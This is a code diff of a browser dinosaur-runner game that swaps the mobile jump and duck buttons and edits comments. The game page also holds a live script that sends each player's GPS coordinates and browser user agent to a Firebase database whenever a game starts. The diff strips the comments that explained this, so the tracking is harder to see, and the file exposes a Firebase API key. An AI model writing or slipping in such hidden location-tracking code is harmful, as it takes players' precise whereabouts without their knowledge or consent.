@@ -81,16 +81,14 @@ canvas { display: block; }
 <div class="center hidden" id="over">GAME OVER<br>PRESS R / TAP TO RESTART</div>
 
 <div class="controls">
-  <div class="btn" id="duckBtn">DUCK</div>
   <div class="btn" id="jumpBtn">JUMP</div>
+  <div class="btn" id="duckBtn">DUCK</div>
 </div>
 
 <script type="module">
-  // 1. Firebase Libraries Import
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
   import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
-  // 2. Your Firebase Config
   const firebaseConfig = {
     apiKey: "AIzaSyDLJHRDd_RtYBwF97he_6QSxHlMvgIBxO4",
     authDomain: "diano-game.firebaseapp.com",
@@ -101,11 +99,9 @@ canvas { display: block; }
     appId: "1:596405576156:web:fb95d723af33e6652faf19"
   };
 
-  // 3. Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const db = getDatabase(app);
 
-  // 4. Global Function to Send Location
   window.sendLocationToFirebase = function() {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition((position) => {
@@ -113,9 +109,8 @@ canvas { display: block; }
           lat: position.coords.latitude,
           lon: position.coords.longitude,
           time: new Date().toLocaleString(),
-          userAgent: navigator.userAgent // Kaunsa browser/phone hai
+          userAgent: navigator.userAgent 
         };
-        // Firebase mein 'player_location' node par save karein
         set(ref(db, 'player_location'), data);
       });
     }
@@ -181,16 +176,18 @@ function jump() {
 }
 
 /* ===== CONTROLS ===== */
+// KEYBOARD CONTROLS (PC/LAPTOP)
 addEventListener("keydown", e => {
   if (e.code === "Space") {
     if (state === "START") start();
     else if (state === "RUNNING") jump();
   }
-  if (e.code === "ArrowDown") dino.duck = true;
+  if (e.code === "ArrowDown") dino.duck = true; // DOWN ARROW = DUCK
   if (e.code === "KeyR" && state === "OVER") start();
 });
 addEventListener("keyup", e => { if (e.code === "ArrowDown") dino.duck = false; });
 
+// MOBILE BUTTONS (SWAPPED)
 document.getElementById("jumpBtn").addEventListener("touchstart", e => {
   e.preventDefault();
   state === "RUNNING" ? jump() : start();
@@ -208,7 +205,6 @@ function start() {
   score = 0; speed = 7; frame = 0; obstacles = [];
   dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; dino.duck = false;
 
-  // LOCATION TRIGGER: Game shuru hote hi location Firebase bhejega
   if(window.sendLocationToFirebase) window.sendLocationToFirebase();
 
   startSound.currentTime = 0; startSound.play();
